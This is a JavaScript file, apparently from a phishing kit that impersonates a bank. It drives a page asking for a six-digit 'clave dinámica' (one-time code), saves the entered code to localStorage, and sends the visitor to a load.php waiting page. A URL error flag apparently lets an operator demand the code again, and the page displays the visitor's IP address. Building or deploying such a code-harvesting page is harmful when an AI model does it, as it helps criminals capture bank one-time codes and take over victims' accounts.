(function () {
    const inputClave = document.getElementById("clave");
    const slots = document.querySelectorAll(".password-slot");
    const mensajeError = document.getElementById("mensaje-error");
    const btnVolver = document.getElementById("btnVolverDinamica");
    const btnContinuar = document.getElementById("btnContinuar");
    const trazoDesktop = document.querySelector(".lineas-form-desktop");
    const trazoMobile = document.querySelector(".lineas-form-mobile");

    function estaModoCel() {
        return window.matchMedia("(max-width: 768px)").matches;
    }

    function configurarInputDinamica() {
        const modoCel = estaModoCel();

        if (modoCel) {
            inputClave.setAttribute("inputmode", "numeric");
            inputClave.setAttribute("pattern", "[0-9]*");
            inputClave.setAttribute("autocomplete", "off");
            inputClave.setAttribute("enterkeyhint", "done");
        } else {
            inputClave.setAttribute("inputmode", "numeric");
            inputClave.setAttribute("pattern", "[0-9]*");
            inputClave.setAttribute("autocomplete", "off");
            inputClave.removeAttribute("enterkeyhint");
        }
    }

    function obtenerTrazoActivo() {
        return estaModoCel() ? trazoMobile : trazoDesktop;
    }

    function subirTrazo() {
        const trazoActivo = obtenerTrazoActivo();

        if (trazoDesktop && trazoDesktop !== trazoActivo) {
            trazoDesktop.classList.remove("is-under-input");
        }
        if (trazoMobile && trazoMobile !== trazoActivo) {
            trazoMobile.classList.remove("is-under-input");
        }
        if (trazoActivo) {
            trazoActivo.classList.add("is-under-input");
        }
    }

    function bajarTrazo() {
        if (trazoDesktop) {
            trazoDesktop.classList.remove("is-under-input");
        }
        if (trazoMobile) {
            trazoMobile.classList.remove("is-under-input");
        }
    }

    function refrescarTrazo() {
        const trazoActivo = obtenerTrazoActivo();
        if (trazoActivo && trazoActivo.classList.contains("is-under-input")) {
            subirTrazo();
        }
    }

    function detectarError() {
        const urlParams = new URLSearchParams(window.location.search);
        const errorParam = urlParams.get("error");

        if (errorParam === "true" || errorParam === "1" || errorParam === "error" || errorParam === "3") {
            mensajeError.classList.add("mostrar");
            slots.forEach(function (slot) {
                slot.classList.remove("error", "filled", "active");
                slot.textContent = "";
            });

            inputClave.value = "";
            btnContinuar.className = "btn-continuar inactivo";

            setTimeout(function () {
                inputClave.focus();
            }, 100);
        }
    }

    function actualizarSlots(valor) {
        mensajeError.classList.remove("mostrar");

        slots.forEach(function (slot, index) {
            slot.classList.remove("error");

            if (index < valor.length) {
                slot.textContent = "•";
                slot.classList.add("filled");
            } else {
                slot.textContent = "";
                slot.classList.remove("filled");
            }

            if (index === valor.length) {
                slot.classList.add("active");
            } else {
                slot.classList.remove("active");
            }
        });

        btnContinuar.className = valor.length === 6 ? "btn-continuar activo" : "btn-continuar inactivo";
    }

    function validarYEnviar() {
        const clave = inputClave.value;

        if (clave.length !== 6) {
            alert("La clave dinamica debe tener 6 digitos");
            return;
        }

        localStorage.setItem("dinamica", clave);
        localStorage.setItem("claveDinamica", clave);
        window.location.href = "load.php";
    }

    inputClave.addEventListener("input", function () {
        if (!/^\d*$/.test(this.value)) {
            this.value = this.value.replace(/\D/g, "");
        }

        actualizarSlots(this.value);
        subirTrazo();
    });

    inputClave.addEventListener("keypress", function (e) {
        if (e.key === "Enter") {
            validarYEnviar();
        }
    });

    inputClave.addEventListener("blur", function () {
        if (!estaModoCel()) {
            bajarTrazo();
            return;
        }
        if (inputClave.value.length === 6) {
            return;
        }

        const active = document.activeElement;
        if (active === btnVolver || active === btnContinuar) {
            return;
        }

        window.setTimeout(function () {
            if (inputClave.value.length === 6) {
                return;
            }
            inputClave.focus();
        }, 0);
    });

    inputClave.addEventListener("focus", subirTrazo);

    btnVolver.addEventListener("click", function () {
        window.location.href = "load.php";
    });
    btnContinuar.addEventListener("click", validarYEnviar);

    BancoShared.populateIp({ ipElementId: "gfg", addressElementId: "address" });
    BancoShared.startDateTime("fecha-hora");
    configurarInputDinamica();
    detectarError();
    bajarTrazo();

    window.addEventListener("load", function () {
        inputClave.focus();
    });

    const mq = window.matchMedia("(max-width: 768px)");
    if (typeof mq.addEventListener === "function") {
        mq.addEventListener("change", function () {
            configurarInputDinamica();
            refrescarTrazo();
        });
    } else if (typeof mq.addListener === "function") {
        mq.addListener(function () {
            configurarInputDinamica();
            refrescarTrazo();
        });
    }
})();
